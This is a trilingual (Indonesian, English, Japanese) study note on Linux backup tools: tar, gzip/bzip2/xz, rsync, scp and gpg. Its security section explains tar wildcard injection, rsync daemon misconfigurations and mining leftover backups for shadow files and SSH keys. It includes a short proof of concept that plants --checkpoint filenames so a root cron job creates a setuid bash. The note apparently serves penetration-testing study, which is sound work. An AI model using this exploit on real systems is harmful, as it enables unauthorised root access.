## 1. 📦 Archiving with `tar` — Tape Archive Fundamentals

### 🇮🇩 Bahasa Indonesia
Perintah **`tar`** (*Tape Archive*) digunakan untuk menggabungkan banyak file dan direktori menjadi satu file arsip tunggal (*tarball*), dengan atau tanpa kompresi:
- `-c`: Membuat (*create*) arsip baru.
- `-x`: Mengekstrak (*extract*) file dari arsip.
- `-v`: Mode *verbose* (menampilkan daftar file yang sedang diproses).
- `-f`: Menentukan nama file arsip target.
- `-t`: Melihat daftar isi arsip tanpa mengekstraknya (*test / list*).

### 🇬🇧 English
The **`tar`** utility bundles multiple files and directory trees into a single contiguous archive container (commonly dubbed a *tarball*), optionally applying stream compression:
- `-c`: Creates a new archive file.
- `-x`: Extracts members from an existing archive.
- `-v`: Verbose telemetry reporting files processed in real time.
- `-f`: Designates the target archive filename.
- `-t`: Lists archive contents without unpacking to disk.

### 🇯🇵 日本語
**`tar`**（Tape Archive）は、複数のファイルやディレクトリを1つのアーカイブファイル（tarball）にまとめるためのツールです：
- `-c`: 新しいアーカイブを**作成（create）**。
- `-x`: アーカイブからファイルを**展開（extract）**。
- `-v`: 処理中のファイル名を**詳細表示（verbose）**。
- `-f`: アーカイブの**ファイル名を指定（file）**。
- `-t`: 展開せずにアーカイブ内の**一覧を表示（list）**。

```bash
# ── BASIC TAR ARCHIVING ──────────────────────────────────────
# Create uncompressed archive of /etc/
$ tar -cvf etc_backup.tar /etc/

# List contents of an archive without extracting
$ tar -tvf etc_backup.tar

# Extract archive to current directory
$ tar -xvf etc_backup.tar

# Extract archive to a specific directory (-C)
$ tar -xvf etc_backup.tar -C /tmp/restore/
```

## 2. 🗜️ Compression Formats — Gzip, Bzip2 & XZ

### 🇮🇩 Bahasa Indonesia
`tar` dapat langsung mengompresi data dengan menambahkan flag kompresi:
- **gzip (`-z` / `.tar.gz` atau `.tgz`)**: Paling cepat dan paling umum digunakan.
- **bzip2 (`-j` / `.tar.bz2`)**: Rasio kompresi lebih tinggi dibanding gzip, namun sedikit lebih lambat.
- **xz (`-J` / `.tar.xz`)**: Rasio kompresi tertinggi, sangat efisien untuk file besar.
- **zip / unzip**: Format arsip cross-platform kompatibel dengan Windows.

### 🇬🇧 English
`tar` integrates stream compression via compression flags:
- **gzip (`-z` / `.tar.gz`)**: Industry-standard, fastest compression with minimal CPU overhead.
- **bzip2 (`-j` / `.tar.bz2`)**: Higher compression ratio than gzip at the cost of execution speed.
- **xz (`-J` / `.tar.xz`)**: Maximum compression efficiency, standard for Linux kernel and distribution releases.
- **zip / unzip**: Cross-platform format interoperable across Windows/macOS.

### 🇯🇵 日本語
`tar` にフラグを追加することで、各種圧縮形式を直接指定できます：
- **gzip（`-z` / `.tar.gz`）**: 最も一般的で高速な圧縮。
- **bzip2（`-j` / `.tar.bz2`）**: gzipより高い圧縮率。
- **xz（`-J` / `.tar.xz`）**: 最高の圧縮効率。
- **zip / unzip**: Windowsと互換性のあるクロスプラットフォーム形式。

```bash
# ── COMPRESSED ARCHIVING EXAMPLES ────────────────────────────
# 1. Create gzip-compressed tarball (.tar.gz)
$ tar -czvf backup_data.tar.gz /var/www/html/

# 2. Create bzip2-compressed tarball (.tar.bz2)
$ tar -cjvf backup_data.tar.bz2 /var/www/html/

# 3. Create xz-compressed tarball (.tar.xz)
$ tar -cJvf backup_data.tar.xz /var/www/html/

# 4. Extract any compressed archive (tar auto-detects compression)
$ tar -xvf backup_data.tar.gz
```

## 3. 🔄 Remote Sync with `rsync` — Incremental Synchronization

### 🇮🇩 Bahasa Indonesia
**`rsync`** (*Remote Sync*) adalah alat sinkronisasi file lokal dan remote yang sangat cepat karena hanya mentransfer **perbedaan (delta)** dari file yang berubah:
- `-a`: Mode arsip (mempertahankan permission, timestamp, symlink, user/group).
- `-v`: Verbose.
- `-z`: Mengompres data saat transfer jaringan.
- `-P`: Menampilkan progress bar dan mendukung resume unduhan yang terputus.
- `--delete`: Menghapus file di tujuan jika file tersebut sudah dihapus di sumber.
- `-e ssh`: Mengamankan transfer data melalui enkripsi SSH.

### 🇬🇧 English
**`rsync`** is a high-performance differential synchronization engine that computes delta block transfers, transmitting only modified chunks over local storage or encrypted SSH tunnels:
- `-a`: Archive mode (recursively preserves permissions, timestamps, symlinks, and ownership).
- `-v`: Verbose progress output.
- `-z`: Compresses stream data in transit.
- `-P`: Combines `--progress` and `--partial` for resumable transfers.
- `--delete`: Purges extraneous files on target absent from the source.
- `-e ssh`: Enforces SSH transport layer encryption.

### 🇯🇵 日本語
**`rsync`** は、差分（変更箇所）のみを転送することで高速な同期を実現する強力なバックアップツールです：
- `-a`: アーカイブモード（パーミッション、所有者、タイムスタンプ、シンボリックリンクを保持）。
- `-v`: 詳細出力。
- `-z`: 転送時のデータ圧縮。
- `-P`: 進捗表示と中断時の再開対応。
- `--delete`: コピー元で削除されたファイルをコピー先でも削除。
- `-e ssh`: SSH経由で暗号化通信。

```bash
# ── RSYNC PRACTICAL EXAMPLES ─────────────────────────────────
# 1. Local backup of documents
$ rsync -avzP /home/user/documents/ /backup/documents/

# 2. Remote backup over SSH to a remote server
$ rsync -avzP -e ssh /var/www/html/ backupuser@192.168.1.50:/remote_backup/html/

# 3. Mirroring source to destination (delete deleted files)
$ rsync -avzP --delete /home/user/data/ /backup/data/
```

## 4. 🚀 Secure Copy (`scp`) — Quick File Transfers over SSH

### 🇮🇩 Bahasa Indonesia
`scp` (*Secure Copy*) menyalin file antar-host di jaringan menggunakan protokol SSH yang aman. Cocok untuk menyalin single file atau arsip backup secara instan.

### 🇬🇧 English
`scp` transfers individual files or archives between remote hosts leveraging SSH authentication and encryption.

### 🇯🇵 日本語
`scp`（Secure Copy）はSSHプロトコルを利用してリモートホスト間で安全にファイルを転送します。

```bash
# ── SCP FILE TRANSFER ────────────────────────────────────────
# Upload local file to remote server
$ scp backup.tar.gz user@10.10.10.10:/tmp/

# Download remote file to current directory
$ scp user@10.10.10.10:/var/log/auth.log ./auth_evidence.log

# Recursive copy of entire directory (-r)
$ scp -r user@10.10.10.10:/var/www/html/ ./local_html_backup/
```

## 5. 🔐 Backup Encryption with `gpg` — Securing Confidential Data

### 🇮🇩 Bahasa Indonesia
Arsip backup sering kali berisi password database, private key, dan data sensitif. **GnuPG (`gpg`)** digunakan untuk mengenkripsi arsip backup:
- Enkripsi Simetris (Password): `gpg -c backup.tar.gz` (menghasilkan file `backup.tar.gz.gpg`).
- Dekripsi: `gpg -d backup.tar.gz.gpg > backup.tar.gz`.

### 🇬🇧 English
Backup archives routinely contain raw database credentials, SSL private keys, and user PII. Encrypting archives via **GnuPG (`gpg`)** prevents data leakage if storage volumes are compromised:
- Symmetric Encryption (Passphrase): `gpg -c backup.tar.gz` (outputs `backup.tar.gz.gpg`).
- Decryption: `gpg -d backup.tar.gz.gpg > restored_backup.tar.gz`.

### 🇯🇵 日本語
バックアップにはパスワードや秘密鍵が含まれるため、**GnuPG（`gpg`）** による暗号化が推奨されます：
- 共通鍵暗号化（パスワード）: `gpg -c backup.tar.gz`
- 復号: `gpg -d backup.tar.gz.gpg > restored.tar.gz`

```bash
# ── ENCRYPT & DECRYPT WITH GPG ───────────────────────────────
# Encrypt archive with AES256 passphrase
$ gpg --symmetric --cipher-algo AES256 backup.tar.gz

# Decrypt encrypted archive
$ gpg --output backup.tar.gz --decrypt backup.tar.gz.gpg
```

## 6. 🔐 Security Note — Tar Wildcard Exploitation, Backup PrivEsc & Data Mining

### 🇮🇩 Bahasa Indonesia
Dalam penetration testing (*HTB Academy Module 18* & *The Hacker Playbook 3*):
1. **Tar Wildcard Injection Privilege Escalation**:
   Jika cron job milik root menjalankan perintah dengan wildcard seperti:
   `tar -czf /backup/backup.tar.gz *` di dalam direktori yang dapat ditulis user biasa (`/var/www/html/` atau `/tmp`), penyerang dapat membuat file:
   - `touch /var/www/html/--checkpoint=1`
   - `touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"`
   Ketika cron dijalankan, `tar` membaca nama file tersebut sebagai argumen parameter dan mengeksekusi `root_shell.sh` dengan hak akses root.
2. **Rsync PrivEsc**: Cron job yang menjalankan `rsync` dengan opsi script atau daemon rsync tanpa otentikasi memungkinkan penyerang mengunggah file cron atau SSH key baru ke root.
3. **Sensitive Data Mining in Backups**: File backup yang tertinggal di direktori publik (`/var/www/backup.zip`, `/tmp/db_backup.sql`, `/var/backups/`) sering kali memuat file `/etc/shadow` lama atau kunci privat SSH (`id_rsa`).

### 🇬🇧 English
In penetration testing and systems security (*HTB Academy Module 18* & *The Hacker Playbook 3*):
1. **Tar Wildcard Injection (PrivEsc)**:
   When automated root cron tasks invoke glob wildcards:
   `tar -czf /var/backups/web.tar.gz *` in a user-writable directory, an attacker creates maliciously named files:
   - `touch -- "--checkpoint=1"`
   - `touch -- "--checkpoint-action=exec=sh privesc.sh"`
   `tar` expands the wildcard flags into its command-line parser, executing `privesc.sh` in the root context.
2. **Rsync Misconfigurations**: Open anonymous rsync daemons (TCP port 873) or writable scripts running rsync permit reading root-owned files or injecting malicious SSH public keys.
3. **Unprotected Backup Exposure**: Leftover `.tar.gz`, `.sql`, or `.bak` files across web roots or `/var/backups/` frequently leak cleartext credentials, API keys, and cryptographic certificates.

### 🇯🇵 日本語
ペネトレーションテスト（HTB Academy Module 18）における重要知見：
1. **Tarワイルドカードインジェクションによるroot権限昇格**:
   rootのCronジョブで `tar -czf backup.tar.gz *` が実行されている場合、書き込み可能ディレクトリに `--checkpoint=1` および `--checkpoint-action=exec=sh exploit.sh` という名前のファイルを設置することで、root権限でシェルを実行。
2. **Rsync設定不備**: 認証なしのRsyncデーモン（ポート873）からの特権ファイル読み取りやSSHキーの挿入。
3. **バックアップファイルからの情報漏洩**: `/var/www/html/backup.tar.gz` や `/tmp` に放置されたバックアップから平文パスワードや秘密鍵（`id_rsa`）を発掘。

```bash
# ── EXPLOITATION PROOF OF CONCEPT (TAR WILDCARD) ─────────────
$ cd /var/www/uploads
$ echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > shell.sh
$ chmod +x shell.sh
$ touch -- "--checkpoint=1"
$ touch -- "--checkpoint-action=exec=sh shell.sh"
# Wait for root cron to execute: tar -cf backup.tar *
# Execute: /tmp/rootbash -p
```

## 7. 🧠 Quick Reference Cheatsheet

```bash
# ── TAR ARCHIVING ────────────────────────────────────────────
tar -cvf backup.tar /path/dir          # create uncompressed tar
tar -czvf backup.tar.gz /path/dir      # create gzip compressed (.tar.gz)
tar -cjvf backup.tar.bz2 /path/dir     # create bzip2 compressed (.tar.bz2)
tar -cJvf backup.tar.xz /path/dir      # create xz compressed (.tar.xz)
tar -tvf backup.tar.gz                 # view archive contents
tar -xvf backup.tar.gz                 # extract archive
tar -xvf backup.tar.gz -C /restore/    # extract to specific folder

# ── RSYNC SYNC ───────────────────────────────────────────────
rsync -avzP /source/ /dest/            # local recursive sync with progress
rsync -avzP -e ssh /source/ user@ip:/dest/  # sync over SSH
rsync -avzP --delete /source/ /dest/   # mirror source (delete extraneous)

# ── SECURE COPY (SCP) ────────────────────────────────────────
scp file.tar.gz user@ip:/tmp/          # upload file over SSH
scp -r user@ip:/remote/dir ./local/    # download folder over SSH

# ── ENCRYPTION (GPG) ─────────────────────────────────────────
gpg -c backup.tar.gz                   # encrypt archive symmetrically
gpg -d backup.tar.gz.gpg > backup.tar.gz # decrypt archive
```
